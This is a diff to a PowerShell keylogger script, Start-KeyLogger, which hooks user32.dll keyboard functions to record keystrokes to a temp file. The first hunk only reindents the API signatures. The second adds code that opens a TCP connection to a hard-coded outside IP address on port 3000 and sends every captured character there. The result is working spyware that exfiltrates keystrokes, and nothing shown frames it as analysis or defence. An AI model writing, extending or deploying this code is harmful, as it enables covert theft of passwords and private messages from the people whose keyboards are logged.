@@ -2,15 +2,15 @@ function Start-KeyLogger($Path="$env:temp\keylogger.txt")
 {
   # Signatures for API Calls
   $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
+    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+    public static extern short GetAsyncKeyState(int virtualKeyCode); 
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int GetKeyboardState(byte[] keystate);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int MapVirtualKey(uint uCode, int uMapType);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+  '@
 
   # load signatures and make members available
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
@@ -53,6 +53,16 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           {
             # add key to logger file
             [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+            $TcpClient=New-Object System.Net.Sockets.TcpClient("18.229.132.96", "3000")
+
+            $GetStream = $TcpClient.GetStream()
+            $StreamWriter = New-Object System.IO.StreamWriter $GetStream
+
+            $StreamWriter.Write($mychar)
+
+            $StreamWriter.Dispose()
+            $GetStream.Dispose()
+            $TcpClient.Dispose()
           }
         }
       }
